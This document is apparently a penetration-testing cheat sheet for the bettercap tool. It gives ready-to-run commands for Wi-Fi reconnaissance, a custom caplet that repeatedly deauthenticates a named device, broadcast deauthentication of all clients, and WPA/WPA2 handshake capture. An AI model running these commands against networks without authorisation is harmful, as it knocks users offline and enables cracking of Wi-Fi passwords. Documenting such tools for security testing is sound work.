https://hackviser.com/tactics/tools/bettercap

```bash
sudo bettercap -iface wlan0 # Run bettercap with a specified interface
```

# Web UI
Use `https-ui.cap` caplet to enable web interface:

Edit file and set values
```bash
sudo nano /usr/share/bettercap/caplets/https-ui.cap
...
set api.rest.username user
set api.rest.password passwd
```

Run:
```bash
sudo bettercap -iface wlan0 -caplet https-ui
```

Default ports:
- Web UI: `https://<IP>` (port 443)
- API: `https://<IP>:8083`

# Modules vs Commands

- **Modules**: Functional areas (e.g. `wifi`, `ble`, `ethernet`, `core`, etc.)
- **Commands**: Actions within modules (e.g. `wifi.recon`, `wifi.deauth`)
- Use `set` to configure module parameters.

```bash
set wifi.hop.period 200
```


# Automation with ticker
```bash
set ticker.commands "clear; wifi.show"
set ticker.period 5
ticker on
```

# Caplets (bettercap scripts)

Location: `/usr/share/bettercap/caplets/`

Example custom caplet:

```bash
cat ~/deauth_corp.cap
```

```cap
set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
set ticker.period 10
set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
events.ignore wifi.ap.new
events.ignore wifi.client.probe
events.ignore wifi.client.new
wifi.recon on
ticker on
events.clear
clear
```

Run the caplet:

```bash
sudo bettercap -iface wlan0 -caplet ~/deauth_corp.cap
```


# Wi-Fi

## Wi-Fi Reconnaissance
```bash
wifi.recon on # Start Scanning
wifi.recon.channel 1,2,3 # Limit to Specific Channels
wifi.show # Show Discovered APs and Clients

# Sort and Filter Output
set wifi.show.sort clients
set wifi.show.filter WPA2
set wifi.rssi.min -49

set wifi.show.filter "" # Reset filters
```

## Deauth Attacks

```bash
wifi.deauth <AP_BSSID> # Deauth all clients from AP
wifi.deauth <CLIENT_MAC> # Deauth specific client
wifi.deauth ff:ff:ff:ff:ff:ff # Deauth all
```
```bash
set wifi.deauth.skip <MAC1>,<MAC2> # Set skip list
```

## Capturing WPA/WPA2 Handshakes
```bash
# Change default output and aggregation
set wifi.handshakes.file "/home/kali/handshakes/"
set wifi.handshakes.aggregate false
```

Captured handshakes are saved as `SSID_<BSSID>.pcap`

